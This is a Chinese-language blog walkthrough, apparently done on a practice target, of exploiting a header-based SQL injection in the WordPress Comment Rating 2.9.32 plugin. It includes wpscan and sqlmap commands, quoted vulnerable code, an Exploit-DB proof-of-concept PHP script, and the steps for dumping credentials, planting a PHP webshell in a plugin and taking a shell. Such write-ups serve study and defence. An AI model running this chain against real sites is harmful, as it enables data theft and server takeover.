---
title: WordPress插件注入漏洞
date: 2019-03-05 02:40:28
categories: 中间件漏洞
tags: 漏洞复现

---
<blockquote class="blockquote-center">最具挑战性的挑战莫过于提升自我。——迈克尔·F·斯特利</blockquote>

<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div>



## 漏洞名称：

WordPress Plugin Comment Rating 2.9.32 SQL注入漏洞



## 漏洞描述：

wordpress中的comment-rating2.9.32插件中的ck-processkarma.php文件存在HTTP_X_FORWARDED_FOR header inject  Vulnerability



## 漏洞等级

高级



## 漏洞检测方法：

wpscan扫描



## 漏洞利用方法：

1. 浏览网页，发现是WordPress网站


![](http://ww1.sinaimg.cn/large/0078beR7ly1g0s7xhpvnsj30xm0dfjrg.jpg)

2.使用wpscan进行扫描

```
wpscan -u "http://219.153.49.228:48606/" --enumerate vp
```

得出comment-rating插件存在SQL注入漏洞

```
+] Name: comment-rating - v2.9.32
 |  Location: http://219.153.49.228:48606/wp-content/plugins/comment-rating/
 |  Readme: http://219.153.49.228:48606/wp-content/plugins/comment-rating/readme.txt
[!] Directory listing is enabled: http://219.153.49.228:48606/wp-content/plugins/comment-rating/

[!] Title: Comment Rating 2.9.32 - Security Bypass Weakness & SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6428
    Reference: http://packetstormsecurity.com/files/120569/
    Reference: https://secunia.com/advisories/52348/
    Reference: https://www.exploit-db.com/exploits/24552/
```

3.查看 https://www.exploit-db.com/exploits/24552/， 根据其介绍的知是HTTP_X_FORWARDED_FOR header注入漏洞。

```
Vulnerable Code: /wp-content/plugins/comment-rating/ck-processkarma.php

First take the IP from HTTP_X_FORWARDED_FOR header.
-----------------------------------------------------------------------
48         $ip = getenv("HTTP_X_FORWARDED_FOR") ? getenv("HTTP_X_FORWARDED_FOR") : getenv("REMOTE_ADDR");
49         if(strstr($row['ck_ips'], $ip)) {
50            // die('error|You have already voted on this item!'); 
51            // Just don't count duplicated votes
52            $duplicated = 1;
53            $ck_ips = $row['ck_ips'];
54         }

Later made a UPDATE without filter the input.
------------------------------------------------------------------------
77         $query = "UPDATE `$table_name` SET ck_rating_$direction = '$rating', ck_ips = '" . $ck_ips  . "' WHERE ck_comment_id = $k_id";


So let's take a look in the DB

mysql> select * from wp_comment_rating;
+---------------+----------------+--------------+----------------+
| ck_comment_id | ck_ips         | ck_rating_up | ck_rating_down |
+---------------+----------------+--------------+----------------+
|             2 | ,20.209.10.130 |            1 |              0 |
|             3 |                |            0 |              0 |
+---------------+----------------+--------------+----------------+
2 rows in set (0.00 sec)
```

4.EDB提供的POC，但我本地尝试运行这个POC并未成功，所以构造语句，使用sqlmap进行查询

```
<?PHP

define('HOST','http://localhost/wordpress/');
define('IDCOMMENT',2);
$url=parse_url(HOST);
define('URL',$url['path'].'wp-content/plugins/comment-rating/ck-processkarma.php?id='.IDCOMMENT.'&action=add&path=a&imgIndex=1_14_');
for($i=0;$i<1;$i++) lvlup();

function lvlup(){
	global $url;
	$header = "GET ".URL." HTTP/1.1 \r\n";
	$header.= "Host: ".$url['host']."\r\n";
	$header.= "Accept-Encoding: gzip, deflate \r\n";
	$header.= "X-Forwarded-For: ".long2ip(rand(0, "4294967295"))."\r\n";
	$header.= "Connection: close \r\n\r\n";
	$socket  = socket_create(AF_INET, SOCK_STREAM,  SOL_TCP);
	socket_connect($socket,$url['host'], 80);
	socket_write($socket, $header);
	socket_close($socket);
}

?>
```

5.查询语句为：

```
sqlmap "http://219.153.49.228:40602/wp-content/plugins/comment-rating/ck-processkarma.php?id=1&action=add&path=a&imgIndex=1_14_"  -f 
```

然后查出库名，表名，列名，字段名，这个很简单，我就不多说啦。

6，然后登陆账号，在插件中添加PHP一句话木马，记得开启插件功能

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0s8b9y4qyj30tk0fcdgw.jpg)

7，菜刀连接木马即可获取shell.



## 漏洞修复方案：

及时更新插件